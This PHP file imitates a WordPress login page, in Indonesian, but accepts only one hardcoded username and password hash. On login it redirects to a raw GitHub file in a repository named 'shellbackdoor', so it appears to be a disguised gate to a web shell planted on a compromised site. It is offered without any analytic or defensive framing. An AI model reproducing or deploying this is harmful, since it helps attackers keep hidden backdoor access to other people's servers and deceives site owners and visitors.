<?php
session_start();

$validUsername = "hxsichi";
$storedPasswordHash = '$2y$10$irXiwQw8RTKPIL7e.lTr6OhiKsNK2e29Ok6D40QLfBpMnJ1WyZasu';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if ($username === $validUsername && password_verify($password, $storedPasswordHash)) {
        $_SESSION['loggedin'] = true;
        header("Location: https://raw.githubusercontent.com/aexdyhaxor/shellbackdoor/refs/heads/main/mweh.php");
        exit;
    } else {
        $error = "Username atau password salah.";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white p-8 rounded shadow-md w-full max-w-sm text-center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/WordPress_blue_logo.svg" class="w-20 mx-auto mb-6" alt="WordPress Logo" />
    <?php if (!empty($error)): ?>
      <p class="text-red-500 text-sm mb-4"><?= htmlspecialchars($error) ?></p>
    <?php endif; ?>
    <form method="POST" class="space-y-4 text-left">
      <div>
        <label class="block mb-1 text-sm font-semibold">Username</label>
        <input type="text" name="username" class="w-full border border-gray-300 rounded px-3 py-2" required>
      </div>
      <div>
        <label class="block mb-1 text-sm font-semibold">Password</label>
        <input type="password" name="password" class="w-full border border-gray-300 rounded px-3 py-2" required>
      </div>
      <div class="flex items-center justify-between">
        <label class="flex items-center text-sm">
          <input type="checkbox" class="mr-1">
          Ingat saya
        </label>
        <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Masuk</button>
      </div>
    </form>
    <div class="mt-4 text-sm">
      <a href="#" class="text-blue-600 hover:underline">Lupa Kata Sandi?</a>
    </div>
    <div class="mt-4 text-sm">
      <a href="#" class="text-gray-500 hover:underline">&larr; Kembali</a>
    </div>
    <div class="mt-4">
      <select class="border border-gray-300 rounded px-2 py-1 text-sm">
        <option>Bahasa Indonesia</option>
        <option>Español</option>
        <option>English</option>
      </select>
    </div>
  </div>
</body>
</html>
